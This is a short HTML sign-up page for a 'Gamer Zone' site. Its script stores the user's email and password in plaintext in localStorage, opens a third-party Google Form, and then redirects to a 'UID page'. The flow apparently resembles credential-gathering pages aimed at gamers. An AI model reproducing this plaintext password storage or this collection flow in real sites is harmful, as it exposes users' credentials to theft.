<!DOCTYPE html>
<html>
<head>
  <title>Gamer Zone Sign Up</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      height: 100vh;
      width: 100vw;
      background: radial-gradient(circle at top, #1a0000, #000000 60%),
                  linear-gradient(135deg, #ff0000 20%, #000000 80%);
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }

    h1 {
      position: absolute;
      top: 20px;
      color: white;
      text-shadow: 0 0 10px red;
      text-align: center;
      width: 100%;
    }

    .box {
      width: 90%;
      max-width: 340px;
      background: rgba(255,255,255,0.95);
      padding: 20px;
      border-radius: 12px;
      text-align: center;
      box-shadow: 0 0 20px rgba(255,0,0,0.5);
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border-radius: 6px;
      border: 1px solid #ccc;
    }

    button {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      background: black;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    button:hover {
      background: #222;
    }

    .continue-btn {
      display: none;
      margin-top: 10px;
      background: green;
    }

    .footer {
      position: absolute;
      bottom: 10px;
      color: white;
      font-size: 12px;
      text-align: center;
      width: 100%;
    }
  </style>
</head>

<body>

<h1>🎮 Gamer Zone Sign Up</h1>

<div class="box">

  <input type="email" id="email" placeholder="Enter Email">
  <input type="password" id="password" placeholder="Enter Password">

  <button onclick="signup()">Sign Up</button>

  <!-- NEW: continue button -->
  <button class="continue-btn" id="continueBtn" onclick="goUID()">
    Continue to UID Page
  </button>

</div>

<div class="footer">
  © 2026 Gamer Zone. All Rights Reserved
</div>

<script>
function signup() {
  let email = document.getElementById("email").value;
  let password = document.getElementById("password").value;

  if (!email || !password) {
    alert("Please fill all fields");
    return;
  }

  localStorage.setItem("user_email", email);
  localStorage.setItem("user_password", password);

  // open google form
  window.open(
    "https://docs.google.com/forms/d/e/1FAIpQLSddWzlCgcpzw1ZnefYzfvNmSau9p4dbm-V5Zc4UjlUg4vJVDA/viewform?embedded=true",
    "_blank"
  );

  alert("Please complete the form, then click Continue");

  // show continue button
  document.getElementById("continueBtn").style.display = "block";
}

// redirect function
function goUID() {
  window.location.href = "uid.html";
}
</script>

</body>
</html>
